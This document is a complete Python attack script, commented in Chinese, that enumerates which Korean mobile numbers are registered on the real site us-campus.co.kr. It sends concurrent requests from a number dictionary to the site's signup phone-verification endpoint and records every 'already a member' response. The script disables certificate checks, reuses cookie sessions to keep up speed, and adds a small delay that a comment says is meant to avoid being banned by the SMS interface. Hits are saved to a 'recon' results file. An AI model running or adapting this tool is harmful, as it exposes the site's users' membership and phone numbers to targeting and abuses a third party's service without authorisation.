#!/usr/bin/env python3
"""
us-campus.co.kr 高速手机号枚举
用法: python3 fast_phone_enum.py --dict phones_kr_hot.txt [--concurrency 30]
"""
import asyncio
import aiohttp
import argparse
import json
import time

BASE = "https://us-campus.co.kr"
H_BASE = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": f"{BASE}/member/join",
}
HIT_MSG = "이미 회원"


class PhoneChecker:
    def __init__(self, concurrency: int):
        self.sem = asyncio.Semaphore(concurrency)
        self.hits = []

    async def _get_session(self, connector):
        s = aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar())
        await s.get(f"{BASE}/member/join", ssl=False, timeout=aiohttp.ClientTimeout(total=15))
        return s

    async def check_one(self, phone: str, session: aiohttp.ClientSession):
        async with self.sem:
            try:
                async with session.post(
                    f"{BASE}/member/cellphoneCert",
                    data={"countryCode": "82", "cellphone": phone},
                    headers=H_BASE,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=12),
                ) as resp:
                    text = await resp.text()
                    if HIT_MSG in text:
                        return phone
            except Exception:
                pass
        return None

    async def run(self, phones: list, concurrency: int, session_pool: int):
        conn = aiohttp.TCPConnector(limit=concurrency + session_pool, ssl=False)
        hits = []
        done = 0
        total = len(phones)
        t0 = time.time()

        async with aiohttp.ClientSession(connector=conn) as _:
            # 每 worker 复用一个带 cookie 的 session
            workers = min(session_pool, max(1, concurrency // 3))
            sessions = [await self._get_session(conn) for _ in range(workers)]
            try:
                batch = 200
                for i in range(0, total, batch):
                    chunk = phones[i : i + batch]
                    tasks = []
                    for j, phone in enumerate(chunk):
                        sess = sessions[j % len(sessions)]
                        tasks.append(self.check_one(phone, sess))
                    results = await asyncio.gather(*tasks)
                    for r in results:
                        if r:
                            hits.append(r)
                            print(f"[HIT] {r}", flush=True)
                    done += len(chunk)
                    elapsed = time.time() - t0
                    rate = done / elapsed if elapsed else 0
                    if done % 1000 == 0 or done == total:
                        print(
                            f"[进度] {done:,}/{total:,} ({100*done/total:.1f}%) "
                            f"命中={len(hits)} 速度={rate:.1f}/s",
                            flush=True,
                        )
                    await asyncio.sleep(0.05)  # 轻微限速避免短信接口封禁
            finally:
                for s in sessions:
                    await s.close()

        return hits, time.time() - t0


def load_phones(path: str, limit: int = 0) -> list:
    phones = []
    with open(path) as f:
        for line in f:
            p = line.strip().replace("-", "")
            if p.startswith("010") and len(p) == 11 and p.isdigit():
                phones.append(p)
            elif p.startswith(("011", "016", "017", "018", "019")) and len(p) == 11:
                phones.append(p)
            if limit and len(phones) >= limit:
                break
    return phones


async def amain(args):
    phones = load_phones(args.dict, args.limit)
    print(f"字典: {args.dict}")
    print(f"手机号: {len(phones):,}  并发: {args.concurrency}")
    print("接口: POST /member/cellphoneCert")
    print("-" * 50)

    checker = PhoneChecker(args.concurrency)
    hits, elapsed = await checker.run(phones, args.concurrency, args.workers)

    result = {
        "target": BASE,
        "dict": args.dict,
        "scanned": len(phones),
        "hits": hits,
        "hit_count": len(hits),
        "elapsed_sec": round(elapsed, 1),
        "rate_per_sec": round(len(phones) / elapsed, 2) if elapsed else 0,
    }
    with open(args.out, "w") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    print("-" * 50)
    print(f"完成: 扫描 {len(phones):,}  命中 {len(hits)}  耗时 {elapsed:.0f}s")
    print(f"结果: {args.out}")
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dict", default="/workspace/us-campus-recon/dict/phones_kr_hot.txt")
    parser.add_argument("--concurrency", type=int, default=30)
    parser.add_argument("--workers", type=int, default=10, help="session池大小")
    parser.add_argument("--out", default="/workspace/us-campus-recon/dict/phone_hits.json")
    parser.add_argument("--limit", type=int, default=0)
    args = parser.parse_args()
    asyncio.run(amain(args))


if __name__ == "__main__":
    main()
